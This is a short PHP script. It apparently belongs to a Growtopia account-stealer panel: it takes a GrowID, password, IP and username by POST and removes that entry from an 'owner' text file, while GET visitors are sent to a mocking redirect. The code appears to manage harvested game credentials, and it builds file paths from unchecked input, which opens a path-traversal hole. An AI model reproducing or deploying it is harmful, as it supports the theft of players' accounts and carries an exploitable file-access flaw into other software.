<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
header("Location: http://www.googledaariyim.com/?q=Are+you+Dumb?"); /* Tarayıcıyı yönlendir */
}
$id = $_POST['id'];
$growid = $_POST['growid'];
$growpw = $_POST['growpw'];
$username = $_POST['username'];
$ip = $_POST['ip'];
$owner = $_POST['owner'];
$text = $id . ";" . $growid . ";" . $growpw . ";" . $ip . ";" . $username . "+";
echo $text;
$contents = file_get_contents("./Users/" . $owner . ".txt",'r');
$contents = str_replace($text, "", $contents);
file_put_contents("./Users/" . $owner . ".txt", $contents);
?>